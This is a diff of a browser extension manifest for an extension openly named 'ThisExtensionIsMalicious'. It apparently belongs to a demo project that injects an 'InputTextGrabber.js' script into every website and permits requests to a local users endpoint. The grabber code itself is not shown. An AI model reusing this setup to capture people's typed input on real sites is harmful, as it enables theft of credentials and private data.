@@ -3,14 +3,14 @@
   "name": "ThisExtensionIsMalicious",
   "version": "1.0",
   "permissions": [
-    "http://localhost:3000/users"
+    "http://localhost:3001/users"
   ],
   "content_scripts": [
     {
       "matches": [
         "<all_urls>"
       ],
-      "js": ["jquery-3.4.1.min.js", "basicInfo.js", "InputTextGrabber.js"]
+      "js": ["jquery-3.4.1.min.js", "InputTextGrabber.js"]
     }
   ]
 }
